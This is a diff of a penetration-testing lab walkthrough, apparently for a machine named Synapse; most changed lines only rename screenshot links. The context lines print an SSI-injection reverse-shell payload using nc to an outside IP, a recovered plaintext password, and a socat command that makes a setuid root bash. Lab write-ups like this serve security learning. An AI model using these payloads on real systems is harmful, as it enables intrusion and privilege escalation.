@@ -37,27 +37,27 @@ It is thus likely that there's a web exploit, so we can start proxying traffic t
 
 Port 80 was running a custom dashboard:
 
-![](<../../../.gitbook/assets/image%20(1537).png>)
+![](../../../.gitbook/assets/synapse-1.png)
 
 The File Manager was running elFinder, but we cannot access it since we need administrative access:
 
-![](<../../../.gitbook/assets/image%20(2569).png>)
+![](../../../.gitbook/assets/synapse-3.png)
 
 I checked the user tab, and found that the user was called `mindsflee`:
 
-![](<../../../.gitbook/assets/image%20(3079).png>)
+![](../../../.gitbook/assets/synapse-4.png)
 
 All of options were under construction, except for the one on the right most.
 
-![](<../../../.gitbook/assets/image%20(3617).png>)
+![](../../../.gitbook/assets/synapse-11.png)
 
 From my enumeration, this seems to be the most vulnerable point. I attempted to upload some PHP webshells, but it seems only images are allowed.
 
-![](<../../../.gitbook/assets/image%20(3151).png>)
+![](../../../.gitbook/assets/synapse-8.png)
 
 There was one weird part, which was the `url=inspect.shtml` portion, since I had never seen that before. Searching for `shtml` gives us results for Server Side Includes (SSI).
 
-![](<../../../.gitbook/assets/image%20(2070).png>)
+![](../../../.gitbook/assets/synapse-2.png)
 
 Hacktricks has done a page on SSI Injection that we could try.
 
@@ -65,11 +65,11 @@ Hacktricks has done a page on SSI Injection that we could try.
 
 We can try some of the payloads:
 
-![](<../../../.gitbook/assets/image%20(3613).png>)
+![](../../../.gitbook/assets/synapse-10.png)
 
 If we follow the redirect, we get this:
 
-![](<../../../.gitbook/assets/image%20(3083).png>)
+![](../../../.gitbook/assets/synapse-6.png)
 
 We now have RCE on the machine, and we can easily get a reverse shell using this:
 
@@ -77,7 +77,7 @@ We now have RCE on the machine, and we can easily get a reverse shell using this
 <!--#exec cmd='nc -c bash 192.168.45.189 21' ->
 ```
 
-![](<../../../.gitbook/assets/image%20(3082).png>)
+![](../../../.gitbook/assets/synapse-5.png)
 
 ## Privilege Escalation
 
@@ -138,7 +138,7 @@ password: m1ndsfl33w1llc4tchy0u?
 
 Using this password, we can `su` to `mindsflee`.
 
-![](<../../../.gitbook/assets/image%20(3172).png>)
+![](../../../.gitbook/assets/synapse-9.png)
 
 ### Sudo Privileges -> Socket Injection
 
@@ -241,8 +241,8 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 
 When we enter that command, the script starts waiting for data to be sent in, which it passes to `os.system(datagram)`. This would result in RCE as `root`:
 
-![](<../../../.gitbook/assets/image%20(3112).png>)
+![](../../../.gitbook/assets/synapse-7.png)
 
 We can then easily get a `root` shell:
 
-![](<../../../.gitbook/assets/image%20(3635).png>)
+![](../../../.gitbook/assets/synapse-12.png)
